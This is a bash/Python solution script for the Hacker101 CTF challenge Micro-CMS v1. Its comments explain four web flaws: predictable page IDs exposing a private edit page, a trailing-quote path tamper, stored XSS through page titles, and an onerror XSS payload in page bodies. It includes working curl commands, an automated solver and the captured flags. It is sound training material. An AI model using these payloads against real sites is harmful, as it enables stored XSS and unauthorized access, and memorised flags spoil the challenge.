#!/usr/bin/env bash

set -euo pipefail

# Challenge: Micro-CMS v1
# Platform: Hacker101 / HackerOne CTF
# Category: Web
# Flags in this level: 4
#
# Target:
#   https://bb9e09a36d920f362bb16164c9c86de7.ctf.hacker101.com/
#
# What this challenge teaches:
#   This tiny CMS is full of trust mistakes. The same application leaks data in
#   four different ways:
#   1. predictable object IDs reveal a hidden private page
#   2. route/path tampering breaks backend assumptions
#   3. a page title is escaped in one place but injected unsafely on the home page
#   4. dangerous HTML in the body survives weak sanitization and carries a flag
#
# Real-world analogy:
#   This is the security equivalent of a house where:
#   - the back room number is guessable,
#   - one lock jams open if you insert the wrong-shaped key,
#   - the front notice board displays user input without checking it,
#   - and the package scanner only blacklists a few obvious items.
#
# ------------------------------------------------------------------------------
# FLAG 0: Hidden page by predictable ID sequence
# ------------------------------------------------------------------------------
#
# Hints reflected in the app:
#   "Try creating a new page"
#   "How are pages indexed?"
#   "If the front door doesn't open, try the window"
#
# Why it works:
#   After creating a page, the IDs clearly increase in sequence. The public pages
#   are 1 and 2, and a new page lands at a much higher ID, which tells us pages
#   in between can exist even if they are not linked from the homepage.
#
# On this instance:
#   Creating a page showed IDs in the 20s, and probing earlier IDs revealed:
#     /page/7      -> 403 Forbidden
#     /page/edit/7 -> fully accessible edit form
#
# The private page body, including the flag, is visible in the edit textarea.
#
# Manual commands:
#   curl -i -sS -X POST 'https://bb9e09a36d920f362bb16164c9c86de7.ctf.hacker101.com/page/create' \
#     --data-urlencode 'title=seqcheck' \
#     --data-urlencode 'body=x'
#
#   curl -sS 'https://bb9e09a36d920f362bb16164c9c86de7.ctf.hacker101.com/page/edit/7'
#
# ------------------------------------------------------------------------------
# FLAG 1: Path tampering on edit route
# ------------------------------------------------------------------------------
#
# Hint reflected in the app:
#   "Make sure you tamper with every input"
#   "Form submissions aren't the only inputs that come from browsers"
#
# Why it works:
#   The application assumes the page ID path segment is always a normal integer.
#   Adding a trailing quote to the edit URL breaks that assumption:
#     /page/edit/1'
#
# Instead of returning a normal error page, the backend leaks a flag directly.
#
# Manual command:
#   curl -sS "https://bb9e09a36d920f362bb16164c9c86de7.ctf.hacker101.com/page/edit/1'"
#
# ------------------------------------------------------------------------------
# FLAG 2: Title-based XSS that only appears on the home page
# ------------------------------------------------------------------------------
#
# Hint reflected in the app:
#   "Sometimes a given input will affect more than one page"
#   "The bug you are looking for doesn't exist in the most obvious place this input is shown"
#
# Why it works:
#   A malicious page title is escaped safely on the page view itself:
#     /page/<id>
#   but the homepage listing injects the raw title inside the anchor text.
#
# Example title:
#   <img src=x onerror=alert(1)>
#
# After creating a page with that title, the page itself looks escaped, but the
# homepage contains:
#   <a href="page/24"><script>alert("^FLAG^...$FLAG$");</script><img src=x onerror=alert(1)></a>
#
# So the flag is leaked on the homepage, not on the created page.
#
# Manual commands:
#   curl -i -sS -X POST 'https://bb9e09a36d920f362bb16164c9c86de7.ctf.hacker101.com/page/create' \
#     --data-urlencode 'title=<img src=x onerror=alert(1)>' \
#     --data-urlencode 'body=body'
#
#   curl -sS 'https://bb9e09a36d920f362bb16164c9c86de7.ctf.hacker101.com/'
#
# ------------------------------------------------------------------------------
# FLAG 3: Body HTML survives weak sanitization
# ------------------------------------------------------------------------------
#
# Hint reflected in the app:
#   "Script tags are great, but what other options do you have?"
#
# Why it works:
#   The renderer tries to scrub obvious script-related patterns, but dangerous
#   non-script HTML still survives. A payload like:
#     <img src=x onerror=alert(1)>
#   is rendered back into the page, and the server injects the flag into a
#   custom flag attribute on the surviving element.
#
# Manual commands:
#   curl -i -sS -X POST 'https://bb9e09a36d920f362bb16164c9c86de7.ctf.hacker101.com/page/create' \
#     --data-urlencode 'title=img_onerror' \
#     --data-urlencode 'body=<img src=x onerror=alert(1)>'
#
#   curl -sS 'https://bb9e09a36d920f362bb16164c9c86de7.ctf.hacker101.com/page/<new-id>'
#
# ------------------------------------------------------------------------------
# One-shot behavior
# ------------------------------------------------------------------------------
# Running this script performs the four solves and prints all four flags.

python3 - <<'PY'
import re
import requests

base = "https://bb9e09a36d920f362bb16164c9c86de7.ctf.hacker101.com"
flags = []

# FLAG 0: hidden page edit access
r0 = requests.get(base + "/page/edit/7", timeout=20)
m0 = re.search(r"\^FLAG\^[^^$]+?\$FLAG\$", r0.text)
if not m0:
    raise SystemExit("flag 0 not found")
flags.append(m0.group(0))

# FLAG 1: quote-based path tampering
r1 = requests.get(base + "/page/edit/1'", timeout=20)
m1 = re.search(r"\^FLAG\^[^^$]+?\$FLAG\$", r1.text)
if not m1:
    raise SystemExit("flag 1 not found")
flags.append(m1.group(0))

# FLAG 2: title affects homepage listing unsafely
s2 = requests.Session()
r2c = s2.post(
    base + "/page/create",
    data={"title": "<img src=x onerror=alert(1)>", "body": "body"},
    allow_redirects=False,
    timeout=20,
)
home = s2.get(base + "/", timeout=20).text
m2 = re.search(r"\^FLAG\^[^^$]+?\$FLAG\$", home)
if not m2:
    raise SystemExit("flag 2 not found")
flags.append(m2.group(0))

# FLAG 3: dangerous body HTML survives and gets flag attribute
s3 = requests.Session()
r3c = s3.post(
    base + "/page/create",
    data={"title": "img_onerror", "body": "<img src=x onerror=alert(1)>"},
    allow_redirects=False,
    timeout=20,
)
loc3 = r3c.headers.get("Location", "")
if not loc3:
    raise SystemExit("flag 3 page creation failed")
page3 = s3.get(base + loc3, timeout=20).text
m3 = re.search(r"\^FLAG\^[^^$]+?\$FLAG\$", page3)
if not m3:
    raise SystemExit("flag 3 not found")
flags.append(m3.group(0))

for idx, flag in enumerate(flags):
    print(f"FLAG {idx}: {flag}")
PY

# Final flags obtained on this instance:
# FLAG 0: ^FLAG^481befa1cf2357f7f6ea22d5e74ca15b12b3714b7d0dacafdb88d8211e23347e$FLAG$
# FLAG 1: ^FLAG^9ed632e91db3e8c2700cff8ca565e6341f4e10864a8cbd00b9d3fb1bce424520$FLAG$
# FLAG 2: ^FLAG^680c70842ddaf2233afb0dceb895b8c37d25bc04a764dd497aa94dd766adade2$FLAG$
# FLAG 3: ^FLAG^b688020e0f646d6a20457df946434b395d1ac1f9b60b21ea582e5a075cc2b2f6$FLAG$
